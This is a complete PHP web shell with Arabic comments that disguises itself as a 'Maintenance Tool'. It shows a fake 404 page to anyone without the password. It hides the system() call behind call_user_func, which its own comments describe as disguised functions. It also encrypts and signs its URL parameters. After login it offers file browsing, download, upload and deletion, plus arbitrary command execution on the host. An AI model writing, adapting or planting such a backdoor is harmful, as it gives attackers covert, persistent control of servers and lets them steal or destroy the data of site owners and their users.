<?php
session_start();
error_reporting(0);

// 🔑 الإعدادات
$k = 'your-secret-key-456'; // مفتاح التشفير
$pw = password_hash('106', PASSWORD_BCRYPT); // كلمة سر الدخول

// 🛡 تشفير AES + فك تشفير
function enc($d,$k){
  $iv=openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
  return base64_encode(openssl_encrypt($d,'aes-256-cbc',$k,0,$iv).'::'.$iv);
}
function dec($d,$k){
  $p=explode('::',base64_decode($d),2);
  return openssl_decrypt($p[0],'aes-256-cbc',$k,0,$p[1]??'');
}

// 🔑 HMAC
function sign($a,$k){ksort($a);$q=http_build_query($a);$a['t']=hash_hmac('sha256',$q,$k);return'?'.http_build_query($a);}
function verify($a,$k){if(!isset($a['t']))return false;$h=$a['t'];unset($a['t']);ksort($a);return hash_equals($h,hash_hmac('sha256',http_build_query($a),$k));}

// تسجيل الدخول
if(!isset($_SESSION['x'])){
  if(isset($_POST['p']) && password_verify($_POST['p'],$pw)){$_SESSION['x']=true;}
  else{http_response_code(404);echo "<!doctype html><html><head><title>404</title></head><body>Not Found</body></html>";exit;}
}

// تحقق HMAC
if(!empty($_GET) && !verify($_GET,$k)){http_response_code(403);exit;}

// 📂 تحديد المسار
$cwd=isset($_GET['x'])?dec($_GET['x'],$k):getcwd();
$cwd=realpath($cwd)?:getcwd();

// ⚠️ دوال مموهة
$fx="system"; // نخزن اسم الدالة في متغير
function runCMD($cmd,$fx){call_user_func($fx,$cmd);} // تنفيذ الأوامر بشكل غير مباشر

// 🧹 حذف
if(isset($_GET['r'])){ $f=dec($_GET['r'],$k); if(is_file($f))unlink($f); header("Location:".sign(['x'=>enc(dirname($f),$k)],$k)); exit; }

// 📥 تحميل
if(isset($_GET['d'])){ $f=dec($_GET['d'],$k); if(is_file($f)){header('Content-Disposition: attachment; filename="'.basename($f).'"');readfile($f);exit;}}

// رفع ملف
if(isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'],$cwd.'/'.$_FILES['f']['name']);

// واجهة
echo "<!doctype html><html><head><meta charset='UTF-8'><title>Maintenance Tool</title>
<style>body{background:#000;color:#0f0;font-family:monospace;}a{color:#0ff;text-decoration:none;}table{width:100%;border-collapse:collapse;}td,th{border:1px solid #333;padding:4px;}</style></head><body>";
echo "<h2>📂 ".htmlspecialchars($cwd)."</h2><table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach(scandir($cwd) as $f){
  if($f==".")continue;$full="$cwd/$f";$enc=enc($full,$k);
  echo "<tr><td>";
  if(is_dir($full))echo"<a href='".sign(['x'=>$enc],$k)."'>".htmlspecialchars($f)."/</a>";
  else echo htmlspecialchars($f);
  echo "</td><td>".(is_dir($full)?"-":filesize($full)."B")."</td><td>";
  if(!is_dir($full))echo"<a href='".sign(['d'=>$enc],$k)."'>Get</a> | <a href='".sign(['r'=>$enc],$k)."' onclick='return confirm(\"Delete?\")'>Del</a>";
  echo"</td></tr>";
}
echo "</table><form method='post' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='Upload'></form>";
echo "<h3>⚙ Command</h3><form method='post'><input type='text' name='c'><input type='submit' value='Run'></form>";
if(isset($_POST['c'])){echo"<pre>";runCMD($_POST['c'],$fx);echo"</pre>";}
echo "</body></html>";
